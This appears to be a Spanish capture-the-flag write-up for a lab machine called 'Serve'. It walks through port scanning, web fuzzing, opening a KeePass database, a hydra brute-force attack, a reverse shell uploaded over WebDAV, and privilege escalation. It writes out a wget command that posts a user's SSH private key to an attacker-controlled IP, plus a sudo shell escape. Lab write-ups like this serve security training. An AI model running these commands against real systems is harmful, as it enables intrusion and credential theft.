# Máquina Serve

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.160

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 192.168.5.160

![alt text](image-2.png)

### Fuzzing web

feroxbuster --url http://192.168.5.16/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-3.png)

entonces buscamos por archivos:

feroxbuster --url http://192.168.5.160 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -d 5 --threads 50

![alt text](image-4.png)

accedemos a la ruta: htp://192.168.5.160/notes.txt

![alt text](image-5.png)

busqué por extensiones de bases de datos

feroxbuster --url http://192.168.5.160/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x kdbx,db,sqlite,sqlite3,bak,dump,json,xml,sql -d 5 --threads 50

![alt text](image-6.png)

me descargo la base de datos , db.kdbx

intento abrirla y tiene contraseña

![alt text](image-7.png)

abrimos con keepass2 y escribimos la contraseña dreams:

![alt text](image-8.png)

cree el siguiente código en python:  

![alt text](image-9.png)

aplicando un ataque con hydra apuntando al diccionario creado:

![alt text](image-10.png)

### Explotación

Como webdav, es un protocolo que permite a los usuarios gestionar y editar archivos en servidores web remotos de forma colaborativa. Subo una reverse shell mediante curl.

![alt text](image-11.png)

verificamos que se subió el archivo

![alt text](image-12.png)

me coloco en escucha con netcat

![alt text](image-13.png)

visualizo los usuarios:

![alt text](image-14.png)

![alt text](image-16.png)

me envío el id_rsa de teo a mi kali

sudo -u teo /usr/bin/wget --post-file=/home/teo/.ssh/id_rsa 192.168.5.131:1337

![alt text](image-15.png)

copiamos el id_rsa y lo crackeo con RSAcrack

![alt text](image-17.png)

me conecté con el usuario teo por ssh

![alt text](image-18.png)

### Escalar privilegios

![alt text](image-19.png)

sudo /usr/local/bin/bro curl

!/bin/bash



